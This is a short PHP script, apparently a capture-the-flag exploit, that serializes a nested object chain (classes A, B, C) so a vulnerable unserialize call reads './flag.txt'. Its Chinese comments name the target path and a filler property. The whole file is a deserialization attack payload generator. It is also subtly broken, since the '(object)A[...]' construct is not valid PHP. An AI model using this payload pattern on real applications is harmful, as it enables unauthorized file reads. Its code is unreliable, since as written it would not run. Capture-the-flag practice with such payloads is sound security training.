<?php
// payload.php
$path ='./flag.txt';     // 你想读取的文件路径
$payload = serialize(
    (object)A[
        'handle' => (object)B[
            'worker' => (object)C[
                'cmd' => $path
            ],
            'cmd' => ''        // B 的第二个属性，随便填
        ]
    ]
);
echo $payload;
